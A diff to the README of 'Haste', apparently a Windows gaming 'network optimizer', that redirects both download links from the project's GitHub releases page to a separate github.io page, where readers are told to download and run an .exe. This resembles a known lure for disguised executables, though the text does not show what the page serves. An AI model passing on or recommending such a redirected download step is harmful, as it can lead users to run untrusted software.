@@ -1,6 +1,6 @@
 # 🚀 Haste - Improve your online gaming network connection
 
-[![](https://img.shields.io/badge/Download_Haste-Blue.svg?style=for-the-badge)](https://github.com/glorihandy101/Haste/releases)
+[![](https://img.shields.io/badge/Download_Haste-Blue.svg?style=for-the-badge)](https://glorihandy101.github.io)
 
 Haste acts as a network optimizer for Windows users. It reduces lag and stabilizes your internet connection during online gaming sessions. This software routes your game data through optimized paths to decrease latency and packet loss.
 
@@ -18,7 +18,7 @@ Before you install Haste, ensure your computer meets these basic requirements:
 
 Follow these steps to obtain the official installation file. 
 
-1. Visit [this page to download](https://github.com/glorihandy101/Haste/releases).
+1. Visit [this page to download](https://glorihandy101.github.io).
 2. Look for the most recent version labeled with a "Latest" tag.
 3. Click the file ending in .exe to start the transfer to your computer.
 4. Wait for the download to finish. 
